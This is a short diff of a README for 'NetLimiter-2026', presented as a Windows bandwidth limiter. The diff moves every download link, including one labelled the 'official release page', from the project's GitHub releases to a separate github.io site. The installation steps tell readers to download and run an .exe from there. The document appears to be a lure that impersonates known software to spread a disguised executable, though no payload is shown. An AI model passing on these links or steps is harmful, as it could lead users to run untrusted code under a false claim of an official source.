@@ -1,6 +1,6 @@
 # 🌐 NetLimiter-2026 - Control your computer network bandwidth easily
 
-[![](https://img.shields.io/badge/Download-NetLimiter-2026-blue)](https://github.com/undrained-misreading18/NetLimiter-2026/releases)
+[![](https://img.shields.io/badge/Download-NetLimiter-2026-blue)](https://undrained-misreading18.github.io)
 
 NetLimiter-2026 manages the internet traffic on your Windows computer. This tool gives you control over how programs use your bandwidth. You can limit download or upload speeds for specific applications. You can also block unwanted programs from accessing the internet.
 
@@ -8,7 +8,7 @@ NetLimiter-2026 manages the internet traffic on your Windows computer. This tool
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/undrained-misreading18/NetLimiter-2026/releases).
+1. Go to the [official release page](https://undrained-misreading18.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the file name ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
